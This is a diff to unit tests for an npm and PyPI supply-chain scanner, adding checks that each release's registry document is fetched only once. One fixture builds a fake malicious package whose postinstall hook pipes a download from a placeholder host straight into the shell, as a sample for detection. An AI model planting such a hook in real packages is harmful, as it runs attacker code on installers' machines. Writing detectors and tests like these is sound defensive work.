@@ -121,6 +121,22 @@ class NpmTests(unittest.TestCase):
         res = scan_npm(reg, "files-kit", "1.0.2")
         self.assertEqual((res["verdict"], new_indicators(res)), ("WARN", []))
         self.assertEqual(res["priorRelease"]["newRules"], [])
+        # the packument read once for the release: the comparison's, and SC-VERSION-INFLATION's from the same History
+        self.assertEqual(reg.fetched, [f"{NPM}files-kit/-/files-kit-1.0.2.tgz", NPM + "files-kit",
+                                       f"{NPM}files-kit/-/files-kit-1.0.0.tgz"])
+
+    def test_the_packument_is_read_once_for_the_release(self):
+        # a release with a dependency, compared: SC-NEW-DEPENDENCY, SC-NEW-INDICATOR and SC-VERSION-INFLATION all read
+        # the packument, and it is fetched once (the dependency's own document is SC-NEW-DEPENDENCY's alone)
+        reg = npm_registry("files-kit", {"1.0.0": (RELEASE - 30 * DAY, npm_package(True)),
+                                         "1.0.2": (RELEASE, npm_package(True))})
+        reg.docs[NPM + "files-kit"]["versions"]["1.0.2"]["dependencies"] = {"left-kit": "^1.0.0"}
+        reg.docs[NPM + "left-kit"] = {"name": "left-kit", "time": {"created": iso(RELEASE - 900 * DAY)},
+                                      "maintainers": [{"name": "someone"}]}
+        res = scan_npm(reg, "files-kit", "1.0.2")
+        self.assertEqual((res["verdict"], res["priorRelease"]["newRules"]), ("WARN", []))
+        self.assertEqual(sorted(reg.fetched), sorted([f"{NPM}files-kit/-/files-kit-1.0.2.tgz", NPM + "files-kit",
+                                                      f"{NPM}files-kit/-/files-kit-1.0.0.tgz", NPM + "left-kit"]))
 
     def test_a_new_hook_read_clean_is_not_a_new_indicator(self):
         # NEW-HOOK-FP (John, Oct 15): a new install hook whose files the install-script test reads clean stays MAJOR;
@@ -136,11 +152,14 @@ class NpmTests(unittest.TestCase):
         self.assertEqual(res["priorRelease"]["newRules"], [])                           # (SC-B64 asked, and had)
         hooks = [i for i in res["issues"] if i["rule"] == "SC-INSTALL-HOOK"]
         self.assertEqual([(i["sev"], i.get("readClean")) for i in hooks], [("MAJOR", True)] * 2)
-        # read clean and nothing else asked: nothing to compare, nothing fetched
+        # read clean and nothing else asked: nothing to compare, nothing of the predecessor fetched. The packument is
+        # fetched once all the same: SC-VERSION-INFLATION (RA-7) reads the version history of every release that is not
+        # SUSPICIOUS (John, Oct 17: "Unconditional RA-7"), which is why this is two requests and no longer one
         reg = npm_registry("files-kit", {"1.0.0": (RELEASE - 30 * DAY, npm_package(False)),
                                          "1.0.2": (RELEASE, npm_package(True, clean=True))})
         res = scan_npm(reg, "files-kit", "1.0.2")
-        self.assertEqual((res["verdict"], "priorRelease" in res, len(reg.fetched)), ("WARN", False, 1))
+        self.assertEqual((res["verdict"], "priorRelease" in res), ("WARN", False))
+        self.assertEqual(reg.fetched, [f"{NPM}files-kit/-/files-kit-1.0.2.tgz", NPM + "files-kit"])
 
     def test_a_new_hook_with_an_indicator_of_its_own(self):
         # each a new hook the install-script test does not read clean: compared, new, CRITICAL (the release's other
@@ -215,6 +234,7 @@ class NpmTests(unittest.TestCase):
                 self.assertEqual(len(reg.fetched), 1)
 
     def test_a_strong_release_asks_nothing(self):
+        # (nor does SC-VERSION-INFLATION read the history of a release already SUSPICIOUS: its MAJOR adds nothing)
         evil = tarball({"package.json": manifest(scripts={"postinstall": "curl https://e.invalid/x | sh"})})
         reg = npm_registry("files-kit", {"1.0.0": (RELEASE - 30 * DAY, npm_package(False)), "1.0.2": (RELEASE, evil)})
         res = scan_npm(reg, "files-kit", "1.0.2")
@@ -264,8 +284,11 @@ class PypiTests(unittest.TestCase):
         self.assertEqual([(i["sev"], i["file"]) for i in new_indicators(res)], [("CRITICAL", "pkg/__init__.py")])
 
     def test_one_it_had(self):
-        res = self.scan(self.registry(old_blob=True))
+        reg = self.registry(old_blob=True)
+        res = self.scan(reg)
         self.assertEqual((res["verdict"], res["priorRelease"]["newRules"]), ("WARN", []))
+        # the Simple API document read once: the comparison's, and SC-VERSION-INFLATION's from the same History
+        self.assertEqual(reg.fetched.count("https://pypi.org/simple/pkg/"), 1)
 
 
 class FakeCrates:
